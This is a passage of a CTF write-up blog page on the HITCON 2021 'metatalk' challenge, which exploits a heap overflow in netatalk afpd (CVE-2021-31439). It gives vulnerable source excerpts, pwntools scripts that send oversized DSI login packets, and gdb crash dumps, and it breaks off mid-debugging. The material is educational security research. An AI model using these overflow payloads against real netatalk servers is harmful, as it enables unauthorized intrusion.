@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>hitcon CTF 2021 - metatalk | kileak</title>
+
+
+
+
+
+<meta name="description" content="hitcon CTF 2021 - metatalk">
+
+
+<meta name="keywords" content="hitcon, metatalk">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2021/hitcon21-metatalk/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">hitcon CTF 2021 - metatalk</h1>
+      <p class="post-meta">Dec 6, 2021</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>metatalk
+<!--break--></p>
+
+  <p>421 pts - 3 solves</p>
+
+  <p>Let’s talk in the metaverse.</p>
+
+  <p>nc 18.181.73.12 4869</p>
+
+  <p>Environment of challenge server is 5.11.0-1020-aws #21~20.04.2-Ubuntu SMP Fri Oct 1 13:03:59 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</p>
+
+  <p>The metatalk service uses the same dockerfile.</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/hitcon21/metatalk/metatalk.tar.gz">metatalk.tar.gz</a> <a href="https://kileak.github.io/assets/hitcon21/metatalk/exploit.py">exploit.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<p>metatalk was a challenge based on netatalk, which reminded me of <code class="language-plaintext highlighter-rouge">CVE-2018-1160</code> from pwnable.tw. But this time, it was a newer version, in which that bug was already fixed.</p>
+
+<p>But I assumed angelboy might just have found another bug and searched for current CVEs on netatalk-3.1.12 and found <a href="https://www.zerodayinitiative.com/advisories/ZDI-21-492/">CVE-2021-31439</a>, which mentioned “missing validation on the length of user-supplied data prior to copying it to a heap-based buffer” and the title was more specific that it’s about <code class="language-plaintext highlighter-rouge">dsi_doff</code>.</p>
+
+<p>With this information, I searched the source code of netatalk to find out, where this might be happening</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*!
+ * Read DSI command and data
+ *
+ * @param  dsi   (rw) DSI handle
+ *
+ * @return    DSI function on success, 0 on failure
+ */</span>
+<span class="kt">int</span> <span class="nf">dsi_stream_receive</span><span class="p">(</span><span class="n">DSI</span> <span class="o">*</span><span class="n">dsi</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">block</span><span class="p">[</span><span class="n">DSI_BLOCKSIZ</span><span class="p">];</span>
+
+  <span class="n">LOG</span><span class="p">(</span><span class="n">log_maxdebug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_stream_receive: START"</span><span class="p">);</span>
+
+  <span class="p">...</span>
+  
+  <span class="cm">/* read in the header */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">dsi_buffered_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">block</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">block</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">block</span><span class="p">))</span> 
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+  <span class="p">...</span>
+  
+  <span class="c1">// Copy dsi_doff from the just read header</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">,</span> <span class="n">block</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">));</span>
+  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">);</span>
+
+  <span class="p">...</span>
+  
+  <span class="cm">/* make sure we don't over-write our buffers. */</span>
+  <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="n">MIN</span><span class="p">(</span><span class="n">ntohl</span><span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_len</span><span class="p">),</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">server_quantum</span><span class="p">);</span>
+
+  <span class="cm">/* Receiving DSIWrite data is done in AFP function, not here */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">LOG</span><span class="p">(</span><span class="n">log_maxdebug</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_stream_receive: write request"</span><span class="p">);</span>
+
+      <span class="c1">// Overwrite dsi-&gt;cmdlen with dsi_doff without any validation</span>
+      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_doff</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">dsi_stream_read</span><span class="p">(</span><span class="n">dsi</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span> <span class="o">!=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>In the code for reading a <code class="language-plaintext highlighter-rouge">dsi</code> package, it will read our package and copy <code class="language-plaintext highlighter-rouge">dsi_doff</code> into the current <code class="language-plaintext highlighter-rouge">dsi-&gt;header.dsi_data</code>. It then checks for a valid size in <code class="language-plaintext highlighter-rouge">cmdlen</code>, but if <code class="language-plaintext highlighter-rouge">dsi_doff</code> is defined, it will just overwrite <code class="language-plaintext highlighter-rouge">cmdlen</code> without checking, if <code class="language-plaintext highlighter-rouge">dsi_doff</code> is in fact a valid size for the package.</p>
+
+<p><code class="language-plaintext highlighter-rouge">dsi_stream_read</code> will thus just take <code class="language-plaintext highlighter-rouge">dsi_doff</code> as the length for the package to read into the allocated buffer, allowing us to overflow it arbitrarily.</p>
+
+<p>The buffer for reading dsi packages has a size of <code class="language-plaintext highlighter-rouge">0x101000</code>, so specifying a <code class="language-plaintext highlighter-rouge">dsi_doff</code> bigger than that, will result in overwriting data behind it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x00007ffff7dd3000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7eeb000 0x00007ffff7fec000 0x0000000000000000 rw- &lt;= mmapped region for dsi buffer
+0x00007ffff7fec000 0x00007ffff7fee000 0x0000000000000000 rw- 
+0x00007ffff7ff4000 0x00007ffff7ff6000 0x0000000000000000 rw- 
+0x00007ffff7ff6000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so</code></pre></figure>
+
+<p>In the provided Dockerfile, the dsi buffer will be in a <code class="language-plaintext highlighter-rouge">mmapped</code> region followed by two other rw regions.</p>
+
+<p>Checking the following region shows some libc addresses</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffff7fec000:	0x0000000000000000	0x0000000000000000
+0x7ffff7fec010:	0x0000000000000000	0x0000000000000000
+0x7ffff7fec020:	0x0000000000000000	0x0000000000000000
+0x7ffff7fec030:	0x00007ffff735a779	0x0000000009691a75
+0x7ffff7fec040:	0x0000000000000000	0x00007ffff735a785
+0x7ffff7fec050:	0x0000000009691a76	0x0000000000000000
+0x7ffff7fec060:	0x00007ffff735a791	0x000000000d696913
+0x7ffff7fec070:	0x0000000000000000	0x00007ffff735a79b
+0x7ffff7fec080:	0x0000000009691972	0x0000000000000000
+0x7ffff7fec090:	0x00007ffff735a7a7	0x0000000009691973
+0x7ffff7fec0a0:	0x0000000000000000	0x00007ffff735a7b3
+0x7ffff7fec0b0:	0x0000000009691974	0x0000000000000000
+0x7ffff7fec0c0:	0x00007ffff735a7bf	0x000000000d696914
+0x7ffff7fec0d0:	0x0000000000000000	0x00007ffff735a7c9
+0x7ffff7fec0e0:	0x000000000d696915	0x0000000000000000
+0x7ffff7fec0f0:	0x00007ffff735a7d3	0x000000000d696916
+0x7ffff7fec100:	0x0000000000000000	0x00007ffff735a7dd
+0x7ffff7fec110:	0x000000000d696917	0x0000000000000000
+0x7ffff7fec120:	0x00007ffff735a7e7	0x000000000d696918
+0x7ffff7fec130:	0x0000000000000000	0x00007ffff735a7f1
+0x7ffff7fec140:	0x000000000d696919	0x0000000000000000</code></pre></figure>
+
+<p>so overflowing into those regions might open up an exploitation path.</p>
+
+<p>From the pwnable.tw challenge, I already had a good idea, how DSI packages can be sent to <code class="language-plaintext highlighter-rouge">afpd</code>, but we would need to go a bit deeper for this challenge.</p>
+
+<p>Let’s start with a simple script first, to connect to <code class="language-plaintext highlighter-rouge">afpd</code> and initate a session.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"localhost"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">5566</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./afpd"</span>
+
+<span class="n">DSIFUNC_CLOSE</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">DSIFUNC_CMD</span> <span class="o">=</span> <span class="mi">2</span>
+<span class="n">DSIFUNC_STAT</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">DSIFUNC_OPEN</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="n">DSIFUNC_TICKLE</span> <span class="o">=</span> <span class="mi">5</span>
+<span class="n">DSIFUNC_WRITE</span> <span class="o">=</span> <span class="mi">6</span>
+<span class="n">DSIFUNC_ATTN</span> <span class="o">=</span> <span class="mi">8</span>
+<span class="n">DSIFUNC_MAX</span> <span class="o">=</span> <span class="mi">8</span>
+
+<span class="n">DSIOPT_ATTNQUANT</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="n">AFP_LOGIN</span> <span class="o">=</span> <span class="mh">0x12</span>
+<span class="n">AFP_LOGINCONT</span> <span class="o">=</span> <span class="mh">0x13</span>
+<span class="n">AFP_LOGOUT</span> <span class="o">=</span> <span class="mh">0x14</span>
+<span class="n">AFP_LOGINEXT</span> <span class="o">=</span> <span class="mh">0x3f</span>
+
+<span class="k">def</span> <span class="nf">dsi_block</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">requestID</span><span class="p">,</span> <span class="n">doff</span><span class="p">,</span> <span class="n">dsilen</span><span class="p">,</span> <span class="n">reserved</span><span class="p">):</span>
+	<span class="n">block</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">flags</span><span class="p">)</span>
+	<span class="n">block</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+	<span class="n">block</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="n">requestID</span><span class="p">)</span>
+	<span class="n">block</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">doff</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span>
+	<span class="n">block</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">dsilen</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)</span>
+	<span class="n">block</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">reserved</span><span class="p">)</span>
+
+	<span class="k">return</span> <span class="n">block</span>
+
+<span class="k">def</span> <span class="nf">send_dsi_package</span><span class="p">(</span><span class="n">block_cmd</span><span class="p">,</span> <span class="n">request_id</span><span class="p">,</span> <span class="n">doff</span><span class="p">,</span> <span class="n">dsilen</span><span class="p">,</span> <span class="n">reserved</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+	<span class="n">package</span> <span class="o">=</span> <span class="n">dsi_block</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">block_cmd</span><span class="p">,</span> <span class="n">request_id</span><span class="p">,</span> <span class="n">doff</span><span class="p">,</span> <span class="n">dsilen</span><span class="p">,</span> <span class="n">reserved</span><span class="p">)</span>
+	<span class="n">package</span> <span class="o">+=</span> <span class="n">payload</span>
+
+	<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">package</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>	
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Open session"</span><span class="p">)</span>
+
+	<span class="n">cmd</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">DSIOPT_ATTNQUANT</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+	<span class="n">cmd</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
+
+	<span class="n">send_dsi_package</span><span class="p">(</span><span class="n">DSIFUNC_OPEN</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+	
+	<span class="n">HEADER</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">)</span>
+	
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+	
+	<span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="c1"># e = ELF("./afpd")
+</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>		
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+		<span class="c1">#r = process("./afpd")
+</span>		<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"localhost"</span><span class="p">,</span> <span class="mi">5566</span><span class="p">)</span>		
+		<span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+		<span class="n">pause</span><span class="p">()</span>
+	
+	<span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>With this, we can send a <code class="language-plaintext highlighter-rouge">DSIFUNC_OPEN</code> request and check that the connection to the <code class="language-plaintext highlighter-rouge">afpd</code> service works.</p>
+
+<p>After that, I tried to trigger the overflow by sending an oversized login command. Just debugged the login functionality to find out the proper parameters for the call.</p>
+
+<p>We will send a <code class="language-plaintext highlighter-rouge">DSIFUNC_CMD</code> request with the <code class="language-plaintext highlighter-rouge">AFP_LOGIN</code> option, and have to provide the afp version, the login functionality we want to use and the username.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">user</span> <span class="o">=</span> <span class="s">"metatalk"</span>
+<span class="n">version</span> <span class="o">=</span> <span class="s">"AFP2.2"</span>
+<span class="n">uams</span> <span class="o">=</span> <span class="s">"DHX"</span>	
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overflow package data"</span><span class="p">)</span>
+	
+<span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x101000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x4000</span><span class="p">)</span>
+	
+<span class="n">send_dsi_package</span><span class="p">(</span><span class="n">DSIFUNC_CMD</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span></code></pre></figure>
+
+<p>Since we know, that the DSI buffer is located in the mmapped region and has a size of <code class="language-plaintext highlighter-rouge">0x101000</code>, I just appended enough junk and added a cyclic pattern to overflow into the next region.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Thread 1 "afpd" received signal SIGSEGV, Segmentation fault.
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x47306347396246b8
+$rbx   : 0x104ff0          
+$rcx   : 0x00007ffff77458da  →  0x6677fffff0003d48 ("H="?)
+$rdx   : 0xffffffffffffff80
+$rsp   : 0x00007fffffffe810  →  0x0000000061ae0baa
+$rbp   : 0x7               
+$rsi   : 0x00007ffff7faf668  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$rdi   : 0x7               
+$rip   : 0x00007ffff7b98f36  →  &lt;readt+230&gt; mov edi, DWORD PTR [rax]
+$r8    : 0x0               
+$r9    : 0x0               
+$r10   : 0x0               
+$r11   : 0x246             
+$r12   : 0x00007ffff7eee010  →  0x322e325046410612
+$r13   : 0xc1658           
+$r14   : 0x0               
+$r15   : 0xffffffffffffffff
+$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe810│+0x0000: 0x0000000061ae0baa	 ← $rsp
+0x00007fffffffe818│+0x0008: 0x0000000000000000
+0x00007fffffffe820│+0x0010: 0x00007fffffffe880  →  0x0000000000000000
+0x00007fffffffe828│+0x0018: 0x0000000000000080
+0x00007fffffffe830│+0x0020: 0x0000000000000000
+0x00007fffffffe838│+0x0028: 0x0000000800000000
+0x00007fffffffe840│+0x0030: 0x00007fffffffe860  →  0xffffffffffffffff
+0x00007fffffffe848│+0x0038: 0x0000000000000007
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ffff7b98f2c &lt;readt+220&gt;      mov    r15, rax
+   0x7ffff7b98f2f &lt;readt+223&gt;      jne    0x7ffff7b98f00 &lt;readt+176&gt;
+   0x7ffff7b98f31 &lt;readt+225&gt;      call   0x7ffff7b638f0 &lt;__errno_location@plt&gt;
+ → 0x7ffff7b98f36 &lt;readt+230&gt;      mov    edi, DWORD PTR [rax]
+   0x7ffff7b98f38 &lt;readt+232&gt;      mov    r14, rax
+   0x7ffff7b98f3b &lt;readt+235&gt;      cmp    edi, 0x4
+   0x7ffff7b98f3e &lt;readt+238&gt;      je     0x7ffff7b98f0c &lt;readt+188&gt;
+   0x7ffff7b98f40 &lt;readt+240&gt;      cmp    edi, 0xb
+   0x7ffff7b98f43 &lt;readt+243&gt;      jne    0x7ffff7b98ff8 &lt;readt+424&gt;
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "afpd", stopped 0x7ffff7b98f36 in readt (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7ffff7b98f36 → readt()
+[#1] 0x7ffff7b7a960 → dsi_stream_read()
+[#2] 0x7ffff7b7af7b → dsi_stream_receive()
+[#3] 0x40b517 → afp_over_dsi()
+[#4] 0x4098c6 → main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x00007ffff7b98f36 in readt () from /home/metatalk/libatalk.so.18</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">ssize_t</span> <span class="nf">readt</span><span class="p">(</span><span class="kt">int</span> <span class="n">socket</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="k">const</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">setnonblocking</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="p">...</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="n">stored</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">len</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">stored</span><span class="p">,</span> <span class="n">length</span> <span class="o">-</span> <span class="n">stored</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">switch</span> <span class="p">(</span><span class="n">errno</span><span class="p">)</span> <span class="p">{</span></code></pre></figure>
+
+<p>So, this ran into an error in <code class="language-plaintext highlighter-rouge">readt</code> and segfaults trying to store the error code. Let’s just try to give it a “valid” memory address, it can write to.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">command</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="n">AFP_LOGIN</span><span class="p">)</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">version</span><span class="p">))</span> <span class="o">+</span> <span class="n">version</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">uams</span><span class="p">))</span> <span class="o">+</span> <span class="n">uams</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">))</span> <span class="o">+</span> <span class="n">user</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x101000</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">))</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">4736</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x644820</span><span class="p">)</span>							<span class="c1"># bss address for storing errno
+</span><span class="n">command</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">4738</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
+	
+<span class="n">send_dsi_package</span><span class="p">(</span><span class="n">DSIFUNC_CMD</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">command</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
+__GI___libc_malloc (bytes=bytes@entry=0x7f) at malloc.c:3058
+3058	malloc.c: No such file or directory.
+
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x7               
+$rbx   : 0x7f              
+$rcx   : 0x4343434343434343 ("CCCCCCCC"?)
+$rdx   : 0x0               
+$rsp   : 0x00007fffffffe220  →  0x00000000007d00e7
+$rbp   : 0xffffffffffffffb0
+$rsi   : 0x434343434343437b ("{CCCCCCC"?)
+$rdi   : 0x7f              
+$rip   : 0x00007ffff73da2c4  →  &lt;malloc+388&gt; mov rdx, QWORD PTR [rsi+0x40]
+$r8    : 0x204             
+$r9    : 0x00007ffff7b5edaa  →  "libc.so.6"
+$r10   : 0x7               
+$r11   : 0x0               
+$r12   : 0x00007ffff7ffee50  →  "/home/metatalk/libatalk.so.18"
+$r13   : 0x00007ffff7df785e  →  0x3d656c69660a0000
+$r14   : 0x7f              
+$r15   : 0x00007ffff7df7818  →  "symbol %s version %s not defined in file %s with l[...]"
